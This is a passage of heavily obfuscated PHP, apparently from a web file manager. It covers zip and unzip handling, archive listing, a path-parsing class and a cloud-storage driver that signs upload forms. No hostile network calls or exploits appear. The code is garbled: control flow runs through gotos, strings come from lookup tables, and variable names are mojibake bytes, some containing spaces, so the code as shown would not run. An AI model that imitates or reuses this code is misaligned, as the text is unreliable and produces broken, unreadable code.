get_filename_auto($Aˆ×Æí‡¬†, $c™‡´°¶‡[33], $DñÜ‡×ë¼); $BÉÒ¯Ú¿ = self::iconvSystem($Aˆ×Æí‡¬†); goto FœÏöÊËê; Bòã—‰”ÕŠ: if (!$F«‘¢¦£Ò) { del_dir($då³ÀŠâ™ñ); show_json(LNG($c™‡´°¶‡[1023]), !1); } del_dir($då³ÀŠâ™ñ); return $F«‘¢¦£Ò; goto FŠÀƒ²ê“Ü; B½„»ÈÈ: if (count($bô¯Íñ‹ÙÏ) > 1) { $Aâ—İìÕ†† = IO::info(IO::pathFather($EëØ´òÜÍä[$c™‡´°¶‡[75]])); $eÜƒğòƒË = $Aâ—İìÕ††[$c™‡´°¶‡[28]]; } $A™Ä—Û¾¨ = $då³ÀŠâ™ñ; if (!$A™Ä—Û¾¨) { $A™Ä—Û¾¨ = get_path_father($EëØ´òÜÍä[$c™‡´°¶‡[75]]); $b¦í ãö = IO::info($A™Ä—Û¾¨); if (!$b¦í ãö[$c™‡´°¶‡[185]]) { show_json(LNG($c™‡´°¶‡[1022]), !1); } } goto DÔÁ­®†£­; FœÏöÊËê: foreach ($bô¯Íñ‹ÙÏ as $eÌà¾¸‚Ù => $Fì”ñ„¡„ğ) { $bô¯Íñ‹ÙÏ[$eÌà¾¸‚Ù] = self::iconvSystem($Fì”ñ„¡„ğ); } KodArchive::create($BÉÒ¯Ú¿, $bô¯Íñ‹ÙÏ); if (!IO::exist($Aˆ×Æí‡¬†)) { if ($då³ÀŠâ™ñ) { del_dir($då³ÀŠâ™ñ); } show_json(LNG($c™‡´°¶‡[1023]), !1); } goto B Æİ ŠÀˆ; FŠÀƒ²ê“Ü: } public static function unzip($bÇ–åÚíÀ, $BåìãÍËî = "\162\145\x70\x6c\141\x63\x65") { goto FØàËßô¼; eä—¦ª˜ƒ‚: foreach ($Eíôà˜É³ as $cØ›‡Şª¬›) { $cØ›‡Şª¬› = self::iconvApp($cØ›‡Şª¬›); self::move($cØ›‡Şª¬›, $Béğ’äîÂÓ, $BåìãÍËî); } del_dir($D•ÍÛ ×Ë); if (!$eÅóÓƒ“§Û) { del_file($d›…ªïÇã­); } goto E âÙİ¼™ä; DÒ‰—¼è“³: mk_dir($D•ÍÛ ×Ë); $DÄ‚—ÔË = self::fileExt($b‰¸•Óç¨¦); $d›…ªïÇã­ = $D•ÍÛ ×Ë . $B’òù„šç[91] . $DÄ‚—ÔË; goto Eƒ‡Åƒ‰Ÿ¾; E âÙİ¼™ä: return !0; goto A×åï«ìÁ; Eƒ‡Åƒ‰Ÿ¾: if (!@file_exists(self::iconvSystem($d›…ªïÇã­))) { $eÅóÓƒ“§Û = self::localFilePath($FÄÈÖ˜ëÒ, $DÄ‚—ÔË); $d›…ªïÇã­ = $eÅóÓƒ“§Û ? $eÅóÓƒ“§Û : parent::download($FÄÈÖ˜ëÒ, $d›…ªïÇã­); } $d›…ªïÇã­ = self::iconvSystem($d›…ªïÇã­); $C™‹±ò²– = isset($bÇ–åÚíÀ[$B’òù„šç[1026]]) ? $bÇ–åÚíÀ[$B’òù„šç[1026]] : $B’òù„šç[1027]; goto dò±Îˆ„ò; fáôŒÆ¶: $aŒ‚·¾¦Õ = self::tmpFileName($b‰¸•Óç¨¦); $D•ÍÛ ×Ë = TEMP_FILES . $aŒ‚·¾¦Õ; del_dir($D•ÍÛ ×Ë); goto DÒ‰—¼è“³; FØàËßô¼: $B’òù„šç =& $_SERVER[Ìó]; $FÄÈÖ˜ëÒ = $bÇ–åÚíÀ[$B’òù„šç[75]]; $Béğ’äîÂÓ = $bÇ–åÚíÀ[$B’òù„šç[1024]]; goto cğ«Ë­åÓƒ; cğ«Ë­åÓƒ: if (!($b‰¸•Óç¨¦ = parent::info($FÄÈÖ˜ëÒ))) { show_json(LNG($B’òù„šç[1025]), !1); } if (!($f«Ò‘ßè»Û = parent::infoFull($Béğ’äîÂÓ))) { $Béğ’äîÂÓ = parent::mkdir($Béğ’äîÂÓ); $f«Ò‘ßè»Û = array($B’òù„šç[75] => $Béğ’äîÂÓ); } else { if (isset($f«Ò‘ßè»Û[$B’òù„šç[365]]) && trim($f«Ò‘ßè»Û[$B’òù„šç[75]], $B’òù„šç[8]) != trim($Béğ’äîÂÓ, $B’òù„šç[8])) { $b»Ïµâ­¢Ë = KodIO::make($f«Ò‘ßè»Û[$B’òù„šç[456]]); $EÇ³‰É°ì« = parent::fileNameAuto($b»Ïµâ­¢Ë, $f«Ò‘ßè»Û[$B’òù„šç[28]], REPEAT_RENAME_FOLDER, !0); $Béğ’äîÂÓ = parent::mkdir($b»Ïµâ­¢Ë . $EÇ³‰É°ì«); $f«Ò‘ßè»Û = array($B’òù„šç[75] => $Béğ’äîÂÓ); } } $Béğ’äîÂÓ = $f«Ò‘ßè»Û[$B’òù„šç[75]]; goto fáôŒÆ¶; dò±Îˆ„ò: $a¼“×Íè¼ˆ = KodArchive::extract($d›…ªïÇã­, $D•ÍÛ ×Ë . $B’òù„šç[8], $C™‹±ò²–); self::archiveExt(); if (!$a¼“×Íè¼ˆ[$B’òù„šç[1028]]) { show_json($B’òù„šç[1029] . $a¼“×Íè¼ˆ[$B’òù„šç[1030]], !1); } goto fß˜Ä¥ˆ±Œ; fß˜Ä¥ˆ±Œ: Hook::trigger($B’òù„šç[1031], $D•ÍÛ ×Ë); recursion_dir($D•ÍÛ ×Ë, $f‹Üö·“‹, $AÏÙÊŠ·å, 0); $Eíôà˜É³ = array_merge($f‹Üö·“‹, $AÏÙÊŠ·å); goto eä—¦ª˜ƒ‚; A×åï«ìÁ: } public static function unzipList($E•ÎğÛÜ±) { goto a›‘ÕÂ›áŒ; a·Œ ô‚»š: $b²Ü¯Ú”Ï = self::info($d†ø÷ÌîØ‘); $BŞÑĞæÅ‰È = self::fileExt($b²Ü¯Ú”Ï); $dï™ö©È« = self::tmpFileName($b²Ü¯Ú”Ï); goto F‹šáàëË¶; E¤Ãê‘Â´•: if (!is_dir($fì©¢Û×÷œ)) { mk_dir($fì©¢Û×÷œ); } $Cº‚°ìÛÌ = $fì©¢Û×÷œ . $a‚……„â[8] . $c ğ±¶äæ; if (!@file_exists(self::iconvSystem($Cº‚°ìÛÌ))) { if (isset($c‚Š‰‹Ù…¾)) { url_request($a£Ú›±Ø’, $a‚……„â[1035], $Cº‚°ìÛÌ); } else { $b¦˜¯ß½Ë = self::localFilePath($a£Ú›±Ø’, $BŞÑĞæÅ‰È); $Cº‚°ìÛÌ = $b¦˜¯ß½Ë ? $b¦˜¯ß½Ë : self::download($a£Ú›±Ø’, $Cº‚°ìÛÌ); } } goto b„™Ö°âÊĞ; DÍ¦ÖÖ¤ª„: $A ˆÏÉ—…Ä = 50000; if (request_url_safe($a£Ú›±Ø’)) { $c‚Š‰‹Ù…¾ = parse_url_query($a£Ú›±Ø’); if (!isset($c‚Š‰‹Ù…¾[$a‚……„â[75]])) { show_json($a‚……„â[1033], !1); } } $d†ø÷ÌîØ‘ = isset($c‚Š‰‹Ù…¾) ? $c‚Š‰‹Ù…¾[$a‚……„â[75]] : $a£Ú›±Ø’; goto a·Œ ô‚»š; b„™Ö°âÊĞ: $Cº‚°ìÛÌ = self::iconvSystem($Cº‚°ìÛÌ); if ($fç¿â©êêª >= 0) { $d  ƒ‡ÆŠ = isset($E•ÎğÛÜ±[$a‚……„â[1036]]) ? $E•ÎğÛÜ±[$a‚……„â[1036]] : !1; $F‹îµ×‘é = isset($E•ÎğÛÜ±[$a‚……„â[28]]) ? $E•ÎğÛÜ±[$a‚……„â[28]] : $a‚……„â[33]; KodArchive::filePreview($Cº‚°ìÛÌ, $fç¿â©êêª, $d  ƒ‡ÆŠ, $F‹îµ×‘é); self::archiveExt(); die; } $Eğ„†©õõŒ = KodArchive::listContent($Cº‚°ìÛÌ); goto eó†Ú´ƒ˜ò; BŠÙí¿Î’õ: return $Eğ„†©õõŒ[$a‚……„â[1030]]; goto d“§ğ÷•”…; eó†Ú´ƒ˜ò: self::archiveExt(); del_dir($fì©¢Û×÷œ); if (!$Eğ„†©õõŒ[$a‚……„â[1028]]) { show_json($Eğ„†©õõŒ[$a‚……„â[1030]], !1); } goto B²®Ò½Ñ«ù; a›‘ÕÂ›áŒ: $a‚……„â =& $_SERVER[Ìó]; $a£Ú›±Ø’ = $E•ÎğÛÜ±[$a‚……„â[75]]; $fç¿â©êêª = isset($E•ÎğÛÜ±[$a‚……„â[1032]]) ? $E•ÎğÛÜ±[$a‚……„â[1032]] : -1; goto DÍ¦ÖÖ¤ª„; F‹šáàëË¶: if (isset($c‚Š‰‹Ù…¾)) { $CšæÈÙÕœ = array($c‚Š‰‹Ù…¾[$a‚……„â[75]], $c‚Š‰‹Ù…¾[$a‚……„â[1032]], $c‚Š‰‹Ù…¾[$a‚……„â[28]]); $c ğ±¶äæ = md5(implode($a‚……„â[70], $CšæÈÙÕœ)) . $a‚……„â[91] . get_path_ext($c‚Š‰‹Ù…¾[$a‚……„â[28]]); } else { $CšæÈÙÕœ = array($b²Ü¯Ú”Ï[$a‚……„â[28]], $b²Ü¯Ú”Ï[$a‚……„â[75]], $b²Ü¯Ú”Ï[$a‚……„â[77]]); $c ğ±¶äæ = md5(implode($a‚……„â[70], $CšæÈÙÕœ)) . $a‚……„â[91] . $BŞÑĞæÅ‰È; } if ($fç¿â©êêª == -1) { $Bğ¿˜·©² = IO_PATH_SYSTEM_TEMP . "\172\x69\160\x56\151\145\167\57{$dï™ö©È«}\57{$c ğ±¶äæ}\56\154\157\147"; $C£²¾Ç±¾ƒ = self::infoFull($Bğ¿˜·©²); if ($C£²¾Ç±¾ƒ) { $Bğ¿˜·©² = $C£²¾Ç±¾ƒ[$a‚……„â[75]]; $c½ë»ÍÌ°İ = self::getContent($Bğ¿˜·©²); if ($c½ë»ÍÌ°İ) { $d²îÆ˜¶šÌ = json_decode($c½ë»ÍÌ°İ, !0); if (count($d²îÆ˜¶šÌ) >= $A ˆÏÉ—…Ä) { show_json(sprintf(LNG($a‚……„â[1034]), count($d²îÆ˜¶šÌ)), !1); } return $d²îÆ˜¶šÌ; } } else { $Bğ¿˜·©² = self::mkfile($Bğ¿˜·©²); } } $fì©¢Û×÷œ = TEMP_FILES . $dï™ö©È«; goto E¤Ãê‘Â´•; B²®Ò½Ñ«ù: $d²îÆ˜¶šÌ = json_encode($Eğ„†©õõŒ[$a‚……„â[1030]]); self::setContent($Bğ¿˜·©², $d²îÆ˜¶šÌ); if (count($Eğ„†©õõŒ[$a‚……„â[1030]]) >= $A ˆÏÉ—…Ä) { show_json(sprintf(LNG($a‚……„â[1034]), count($Eğ„†©õõŒ[$a‚……„â[1030]])), !1); } goto BŠÙí¿Î’õ; d“§ğ÷•”…: } private static function fileExt($BÉè÷ãÄ¸ß) { $DšØÚ­ç—Ë =& $_SERVER[Ìó]; $e÷Ô­¡”‹ï = $BÉè÷ãÄ¸ß[$DšØÚ­ç—Ë[156]]; if ($e÷Ô­¡”‹ï == $DšØÚ­ç—Ë[1037]) { $BÛí‘Ü‡¯ = $DšØÚ­ç—Ë[1038]; if (substr($BÉè÷ãÄ¸ß[$DšØÚ­ç—Ë[28]], -strlen($BÛí‘Ü‡¯)) == $BÛí‘Ü‡¯) { $e÷Ô­¡”‹ï = $DšØÚ­ç—Ë[1039]; } } self::archiveExt($e÷Ô­¡”‹ï); return $e÷Ô­¡”‹ï; } private static function zipFileList($F„ç¤Úè, $CŠĞçõ÷öö = false) { $d‚ùÀÖë„ =& $_SERVER[Ìó]; $bëÈåˆÈÖ¨ = array(); foreach ($F„ç¤Úè as $aƒ¼§ÍùæÔ) { $fá±ñÑ±¢î = $aƒ¼§ÍùæÔ[$d‚ùÀÖë„[75]]; if ($CŠĞçõ÷öö) { $fá±ñÑ±¢î = self::copy($aƒ¼§ÍùæÔ[$d‚ùÀÖë„[75]], $CŠĞçõ÷öö, $d‚ùÀÖë„[740]); } if ($fá±ñÑ±¢î && self::local()->exist($fá±ñÑ±¢î)) { $bëÈåˆÈÖ¨[$aƒ¼§ÍùæÔ[$d‚ùÀÖë„[75]]] = $fá±ñÑ±¢î; } } if (!empty($bëÈåˆÈÖ¨)) { return array_values($bëÈåˆÈÖ¨); } show_json(LNG($d‚ùÀÖë„[1040]), !1); } public static function tmpFileName($Eé¿—ï½ÊŞ) { $C¤‘†Ï šç =& $_SERVER[Ìó]; $e¯Óœ×Ù÷Œ = array($Eé¿—ï½ÊŞ[$C¤‘†Ï šç[28]], $Eé¿—ï½ÊŞ[$C¤‘†Ï šç[75]], $Eé¿—ï½ÊŞ[$C¤‘†Ï šç[77]], $Eé¿—ï½ÊŞ[$C¤‘†Ï šç[454]]); return md5(implode($C¤‘†Ï šç[70], $e¯Óœ×Ù÷Œ)); } private static function localFilePath($Eš¬œÍÒ¶†, $e«Îï¸É‰„) { goto F“é»Ï¥–; bòŒ³Õš¨í: if ($CßÍ¹ÉÈğ == $BñÈ—„”å[101] || $CßÍ¹ÉÈğ == $BñÈ—„”å[1044]) { if (!$DˆäŠ¨í¼½->exist($DˆäŠ¨í¼½->path)) { show_json(LNG($BñÈ—„”å[100]), !1); } return $DˆäŠ¨í¼½->path; } return !1; goto e¾¡²´¥È“; F“é»Ï¥–: $BñÈ—„”å =& $_SERVER[Ìó]; if ($e«Îï¸É‰„ == $BñÈ—„”å[1041] && strtoupper(substr(PHP_OS, 0, 3)) == $BñÈ—„”å[1042]) { return !1; } $cµÎª¿Í = KodIO::parse($Eš¬œÍÒ¶†); goto D£å»Ñò­ï; D£å»Ñò­ï: if ($cµÎª¿Í[$BñÈ—„”å[29]] == KodIO::KOD_SOURCE) { $EáŸèµ¶ë = Model($BñÈ—„”å[748])->fileInfoGet(KodIO::sourceID($Eš¬œÍÒ¶†)); if (!$EáŸèµ¶ë[$BñÈ—„”å[75]]) { show_json($BñÈ—„”å[1043], !1); } $Eš¬œÍÒ¶† = $EáŸèµ¶ë[$BñÈ—„”å[75]]; } $DˆäŠ¨í¼½ = self::init($Eš¬œÍÒ¶†); $CßÍ¹ÉÈğ = $DˆäŠ¨í¼½->getType(); goto bòŒ³Õš¨í; e¾¡²´¥È“: } private static function archiveExt($E­ËÁöôŠî = '') { $GLOBALS[$_SERVER[Ìó][1045]] = $E­ËÁöôŠî; } } class KodIO { const KOD_SOURCE = "\173\x73\157\165\162\143\145\x7d"; const KOD_USER_RECYCLE = "\x7b\165\x73\x65\x72\122\x65\143\171\143\x6c\x65\x7d"; const KOD_USER_FAV = "\x7b\165\163\x65\x72\106\141\166\175"; const KOD_USER_FILE_TAG = "\173\165\x73\145\x72\x46\x69\154\x65\124\141\147\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\x65\x72\106\151\154\145\124\x79\x70\x65\175"; const KOD_GROUP_ROOT_SELF = "\173\x67\162\157\x75\160\122\157\157\x74\123\x65\154\146\175"; const KOD_USER_SHARE = "\x7b\x75\x73\x65\162\x53\x68\141\x72\145\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\x73\145\x72\123\150\141\x72\145\x4c\151\x6e\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\150\141\162\x65\x54\157\x4d\145\x7d"; const KOD_SHARE_ITEM = "\x7b\x73\150\141\162\x65\111\164\x65\x6d\175"; const KOD_SHARE_LINK = "\x7b\163\150\141\162\x65\111\x74\x65\x6d\114\x69\x6e\153\175"; const KOD_SEARCH = "\173\163\x65\x61\162\143\x68\x7d"; const KOD_BLOCK = "\x7b\x62\154\x6f\x63\153\x7d"; const KOD_IO = "\173\x69\157\x7d"; const KOD_USER_RECENT = "\x7b\x75\x73\x65\x72\x52\145\x6e\143\x65\156\164\x7d"; const KOD_USER_DRIVER = "\x7b\x64\162\x69\x76\145\162\175"; public static function typeList() { $e“†»Â…Í­ =& $_SERVER[Ìó]; return array($e“†»Â…Í­[1046] => self::KOD_SOURCE, $e“†»Â…Í­[1047] => self::KOD_USER_RECYCLE, $e“†»Â…Í­[1048] => self::KOD_USER_FAV, $e“†»Â…Í­[1049] => self::KOD_USER_FILE_TAG, $e“†»Â…Í­[1050] => self::KOD_USER_FILE_TYPE, $e“†»Â…Í­[1051] => self::KOD_GROUP_ROOT_SELF, $e“†»Â…Í­[1052] => self::KOD_USER_SHARE, $e“†»Â…Í­[1053] => self::KOD_USER_SHARE_LINK, $e“†»Â…Í­[1054] => self::KOD_USER_SHARE_TO_ME, $e“†»Â…Í­[1055] => self::KOD_SHARE_ITEM, $e“†»Â…Í­[1056] => self::KOD_SHARE_LINK, $e“†»Â…Í­[1057] => self::KOD_SEARCH, $e“†»Â…Í­[1058] => self::KOD_BLOCK, $e“†»Â…Í­[1059] => self::KOD_IO, $e“†»Â…Í­[1060] => self::KOD_USER_RECENT, $e“†»Â…Í­[1061] => self::KOD_USER_DRIVER); } public static function parse($DºŞ…Ó·È¡) { goto D«Œšùã…; D«Œšùã…: $Dàâæ›‡ =& $_SERVER[Ìó]; $DºŞ…Ó·È¡ = self::clear($DºŞ…Ó·È¡); $e¾‹î—ãˆ¤ = array_values(self::typeList()); goto d‡ø—ó«¹; fÌÙó²¹ó½: $d°¸åÕµ’Ò = array($Dàâæ›‡[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $còˆ¢ÏÎÒ[$Dàâæ›‡[1066]] = in_array($còˆ¢ÏÎÒ[$Dàâæ›‡[29]], $d°¸åÕµ’Ò); return $còˆ¢ÏÎÒ; goto EÚí‚£ÀŒ¥; d‡ø—ó«¹: preg_match($Dàâæ›‡[1062], $DºŞ…Ó·È¡, $aË“¬å™İ¶); $còˆ¢ÏÎÒ = array($Dàâæ›‡[384] => !1, $Dàâæ›‡[1063] => !1, $Dàâæ›‡[381] => !1, $Dàâæ›‡[75] => $DºŞ…Ó·È¡, $Dàâæ›‡[1008] => !1, $Dàâæ›‡[1007] => $Dàâæ›‡[33]); if (is_array($aË“¬å™İ¶) && count($aË“¬å™İ¶) == 5) { $bëØÔ—†­« = $Dàâæ›‡[1064] . $aË“¬å™İ¶[2] . $Dàâæ›‡[311]; if (in_array($bëØÔ—†­«, $e¾‹î—ãˆ¤)) { $còˆ¢ÏÎÒ[$Dàâæ›‡[1008]] = $aË“¬å™İ¶[1]; $còˆ¢ÏÎÒ[$Dàâæ›‡[29]] = $bëØÔ—†­«; $còˆ¢ÏÎÒ[$Dàâæ›‡[1065]] = substr($bëØÔ—†­«, 1, -1); $còˆ¢ÏÎÒ[$Dàâæ›‡[363]] = $aË“¬å™İ¶[3]; } $còˆ¢ÏÎÒ[$Dàâæ›‡[1007]] = $aË“¬å™İ¶[4]; } goto fÌÙó²¹ó½; EÚí‚£ÀŒ¥: } public static function clear($B õ†ğÓã¾) { goto AŒ“¾¼ß÷¦; AŒ“¾¼ß÷¦: $e¨ØÖÔ“Å½ =& $_SERVER[Ìó]; $B õ†ğÓã¾ = str_replace($e¨ØÖÔ“Å½[93], $e¨ØÖÔ“Å½[8], $B õ†ğÓã¾); $fø·”Ôİé = $e¨ØÖÔ“Å½[1067]; goto Fçø®Æ¤; C¸¶¯Ú¾óÍ: if ($B õ†ğÓã¾ == $e¨ØÖÔ“Å½[8]) { return $e¨ØÖÔ“Å½[8]; } $B õ†ğÓã¾ = rtrim($B õ†ğÓã¾, $e¨ØÖÔ“Å½[8]); return $B õ†ğÓã¾; goto D‹ÍÒÒ£ƒ÷; Fçø®Æ¤: if (substr($B õ†ğÓã¾, 0, 3) == $e¨ØÖÔ“Å½[1068]) { $B õ†ğÓã¾ = substr($B õ†ğÓã¾, 3); } while (strstr($B õ†ğÓã¾, $fø·”Ôİé)) { $B õ†ğÓã¾ = str_replace($fø·”Ôİé, $e¨ØÖÔ“Å½[8], $B õ†ğÓã¾); } $B õ†ğÓã¾ = preg_replace($e¨ØÖÔ“Å½[1069], $e¨ØÖÔ“Å½[8], $B õ†ğÓã¾); goto C¸¶¯Ú¾óÍ; D‹ÍÒÒ£ƒ÷: } public static function sourceID($BÅµôˆ˜ÕÚ) { $B˜Ùéğèï× =& $_SERVER[Ìó]; $cäÉ†¾ÇîÍ = self::parse($BÅµôˆ˜ÕÚ); if ($cäÉ†¾ÇîÍ[$B˜Ùéğèï×[29]] !== self::KOD_SOURCE) { show_json(LNG($B˜Ùéğèï×[1070]), !1); } return $cäÉ†¾ÇîÍ[$B˜Ùéğèï×[363]]; } public static function make($AëµØ¿Ãİ«) { if (!$AëµØ¿Ãİ«) { return !1; } return self::makePath(self::KOD_SOURCE, intval($AëµØ¿Ãİ«)); } public static function makeShare($D§ƒØÅ‰ñŒ, $båÚ†ªÜ) { return self::makePath(self::KOD_SHARE_ITEM, $D§ƒØÅ‰ñŒ, $båÚ†ªÜ); } public static function makeFileTypePath($F¡†°šÄ¡×) { return self::makePath(self::KOD_USER_FILE_TYPE, $F¡†°šÄ¡×); } public static function makeFileTagPath($b Áàºøâ) { return self::makePath(self::KOD_USER_FILE_TAG, $b Áàºøâ); } public static function makePath($dõ†ÁøÍ±Ó, $cÀò»ˆ•š¹ = '', $CÉœÍ´›ƒø = '') { $b’„ù“Ç„ =& $_SERVER[Ìó]; $bÉ…ÂãÄÄŞ = substr($dõ†ÁøÍ±Ó, 1, -1); $f‚¶´âÅƒº = $b’„ù“Ç„[1071] . $bÉ…ÂãÄÄŞ . $b’„ù“Ç„[1072] . $cÀò»ˆ•š¹ . $b’„ù“Ç„[1073]; $f‚¶´âÅƒº = $CÉœÍ´›ƒø ? $f‚¶´âÅƒº . $CÉœÍ´›ƒø . $b’„ù“Ç„[8] : $f‚¶´âÅƒº; return $f‚¶´âÅƒº; } public static function hashPath($CóĞ‚¯ªŒ) { $a¦„‹˜²Œ =& $_SERVER[Ìó]; $dˆÔŞ¢ë³à = is_array($CóĞ‚¯ªŒ) ? $CóĞ‚¯ªŒ : IO::info($CóĞ‚¯ªŒ); $E‡Ş¨ƒ¥İ = _get($dˆÔŞ¢ë³à, $a¦„‹˜²Œ[1074], $a¦„‹˜²Œ[33]); if (!$E‡Ş¨ƒ¥İ) { $d„«í§íæ = KodIO::parse($dˆÔŞ¢ë³à[$a¦„‹˜²Œ[75]]); if (!$d„«í§íæ[$a¦„‹˜²Œ[29]]) { $E‡Ş¨ƒ¥İ = IO::hashSimple($dˆÔŞ¢ë³à[$a¦„‹˜²Œ[75]]); } } if (!$E‡Ş¨ƒ¥İ) { $E‡Ş¨ƒ¥İ = md5($dˆÔŞ¢ë³à[$a¦„‹˜²Œ[75]] . $dˆÔŞ¢ë³à[$a¦„‹˜²Œ[77]] . $dˆÔŞ¢ë³à[$a¦„‹˜²Œ[106]]); } return $E‡Ş¨ƒ¥İ; } public static function initSystemPath() { $aåŠ‰¦Şˆª =& $_SERVER[Ìó]; if (defined($aåŠ‰¦Şˆª[1075])) { return; } define($aåŠ‰¦Şˆª[1075], self::systemPath($aåŠ‰¦Şˆª[1076])); define($aåŠ‰¦Şˆª[1077], self::systemPath($aåŠ‰¦Şˆª[1078])); define($aåŠ‰¦Şˆª[1079], self::systemPath($aåŠ‰¦Şˆª[1080])); define($aåŠ‰¦Şˆª[1081], self::systemPath($aåŠ‰¦Şˆª[1082])); } private static function systemPath($Fª‡éÎê˜¦) { goto f°ö¤–ª; f°ö¤–ª: $AÓàšÉ®—İ =& $_SERVER[Ìó]; $dòË–¾Èïñ = $AÓàšÉ®—İ[1083] . ucfirst($Fª‡éÎê˜¦); $f‡ÊÙ©ÈÙº = Model($AÓàšÉ®—İ[1084])->get($dòË–¾Èïñ); goto e¦—‹Çòˆé; e¦—‹Çòˆé: if ($f‡ÊÙ©ÈÙº) { return $f‡ÊÙ©ÈÙº; } if ($Fª‡éÎê˜¦ == $AÓàšÉ®—İ[1076]) { $f‡ÊÙ©ÈÙº = self::make(Model($AÓàšÉ®—İ[748])->systemRootPathAdd($AÓàšÉ®—İ[1085])); } else { $f‡ÊÙ©ÈÙº = self::systemPath($AÓàšÉ®—İ[1076]); $dí†¾¹†Ñ¬ = self::sourceID($f‡ÊÙ©ÈÙº); $f‡ÊÙ©ÈÙº = self::make(Model($AÓàšÉ®—İ[748])->mkdir($dí†¾¹†Ñ¬, $Fª‡éÎê˜¦)); } Model($AÓàšÉ®—İ[1084])->set($dòË–¾Èïñ, $f‡ÊÙ©ÈÙº); goto a±Ä§ Ø¨ˆ; a±Ä§ Ø¨ˆ: return $f‡ÊÙ©ÈÙº; goto FÃôŞ•ˆÉ; FÃôŞ•ˆÉ: } public static function systemFolder($CÁ‹º„À¾ß) { $C“ˆß¡—î = IO_PATH_SYSTEM_SOURCE . $CÁ‹º„À¾ß; $eæ’ñ—¯„‘ = Cache::get($C“ˆß¡—î); if (!$eæ’ñ—¯„‘) { $fÓ”ğø¦Ê = IO::infoFull($C“ˆß¡—î); if (!$fÓ”ğø¦Ê) { $eæ’ñ—¯„‘ = IO::mkdir($C“ˆß¡—î, REPEAT_SKIP); } else { $eæ’ñ—¯„‘ = $fÓ”ğø¦Ê[$_SERVER[Ìó][75]]; } Cache::set($C“ˆß¡—î, $eæ’ñ—¯„‘, 3600 * 10); } return $eæ’ñ—¯„‘; } public static function defaultDriver() { return Model($_SERVER[Ìó][700])->defaultDriver(); } public static function defaultIO() { $bª²ÆÉò“ç =& $_SERVER[Ìó]; $FÙ˜÷¥±î¬ = self::defaultDriver(); return $bª²ÆÉò“ç[1086] . $FÙ˜÷¥±î¬[$bª²ÆÉò“ç[363]] . $bª²ÆÉò“ç[1073]; } public static function fileTypeList() { $ešÊÉÕ—Š¹ =& $_SERVER[Ìó]; $E‡İ›˜åÉ… = $GLOBALS[$ešÊÉÕ—Š¹[6]][$ešÊÉÕ—Š¹[1087]]; foreach ($E‡İ›˜åÉ… as $A™á¤ç’ä => $Aï¯Óõ³òñ) { $b†İ°ÔÔ™Œ = $ešÊÉÕ—Š¹[1088] . $A™á¤ç’ä; $eÔëÎ˜À²ˆ = LNG($b†İ°ÔÔ™Œ); if ($b†İ°ÔÔ™Œ != $eÔëÎ˜À²ˆ) { $E‡İ›˜åÉ…[$A™á¤ç’ä][$ešÊÉÕ—Š¹[28]] = $eÔëÎ˜À²ˆ; } } return $E‡İ›˜åÉ…; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($eÙ¦õç‘¨) { parent::__construct($eÙ¦õç‘¨); $this->signatureVersion($_SERVER[Ìó][196]); } public function uploadFormData($Dì–ñ·»ØÇ, $D¡Üè¢“ë¥ = 3600) { goto aà·Í«„…ê; aà·Í«„…ê: $CöÔ¾œØÑ˜ =& $_SERVER[Ìó]; $B¤¾ÙÚ¦ğ = $CöÔ¾œØÑ˜[181]; $EäßƒèÍÈÆ = $CöÔ¾œØÑ˜[214]; goto C¸ÊÇ›‡¡“; eè¡»Ã¢§: $aÅÇ“áß›¥ = sha1($B¦ÍøßÃ³¿); $BÖ—æÈ»‘ = hash_hmac($CöÔ¾œØÑ˜[214], $aÅÇ“áß›¥, $fµîÓ×ˆôÍ); $aš˜– ê = array($CöÔ¾œØÑ˜[1093] => $B¤¾ÙÚ¦ğ, $CöÔ¾œØÑ˜[1097] => $añæ®†Ù›•, $CöÔ¾œØÑ˜[1101] => base64_encode($B¦ÍøßÃ³¿), $CöÔ¾œØÑ˜[1098] => $EäßƒèÍÈÆ, $CöÔ¾œØÑ˜[1099] => $this->accessKey, $CöÔ¾œØÑ˜[1102] => $ašİ«õğ¢±, $CöÔ¾œØÑ˜[1103] => $BÖ—æÈ»‘, $CöÔ¾œØÑ˜[165] => $this->getHost()); goto DèŒæôë; cÖîÁŞÜÆÄ: $B¦ÍøßÃ³¿ = array($CöÔ¾œØÑ˜[1091] => $e­ïë†ùÉµ, $CöÔ¾œØÑ˜[1092] => array(array($CöÔ¾œØÑ˜[1093] => $B¤¾ÙÚ¦ğ), array($CöÔ¾œØÑ˜[1094] => $this->bucket), array($CöÔ¾œØÑ˜[1095], $CöÔ¾œØÑ˜[1096], $CöÔ¾œØÑ˜[33]), array($CöÔ¾œØÑ˜[1097] => $añæ®†Ù›•), array($CöÔ¾œØÑ˜[1098] => $EäßƒèÍÈÆ), array($CöÔ¾œØÑ˜[1099] => $this->accessKey), array($CöÔ¾œØÑ˜[1100] => $ašİ«õğ¢±))); $B¦ÍøßÃ³¿ = json_encode($B¦ÍøßÃ³¿); $fµîÓ×ˆôÍ = hash_hmac($CöÔ¾œØÑ˜[214], $ašİ«õğ¢±, $this->secret); goto eè¡»Ã¢§; C¸ÊÇ›‡¡“: $añæ®†Ù›• = $CöÔ¾œØÑ˜[1089]; $e­ïë†ùÉµ = gmdate($CöÔ¾œØÑ˜[1090], time() + $D¡Üè¢“ë¥); $ašİ«õğ¢± = (string) time() . $CöÔ¾œØÑ˜[67] . (string) (time() + $D¡Üè¢“ë¥); goto cÖîÁŞÜÆÄ; DèŒæôë: return $aš˜– ê; goto d† Ôù²Æ; d† Ôù²Æ: } public function fileOutLink($dâ¨ë˜ ë‘) { $A‹ªÅ–ñê =& $_SERVER[Ìó]; if (substr($dâ¨ë˜ ë‘, 0, 7) == $A‹ªÅ–ñê[1104]) { $dâ¨ë˜ ë‘ = $A‹ªÅ–ñê[1105] . substr($dâ¨ë˜ ë‘, 7); } header($A‹ªÅ–ñê[152] . $dâ¨ë˜ ë‘); die; } } goto F’œÑÓ‘›; Eà¼í˜õª¬: class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\x6f\x75\x72\143\x65\137\145\x76\x65\x6e\x74"; protected $dataAuto = array(array("\143\x72\x65\x61\x74\145\124\151\x6d\145", "\x74\151\155\145", "\x69\156\163\145\x72\x74", "\146\165\x6e\143\164\x69\157\156"), array("\144\145\163\143", '', 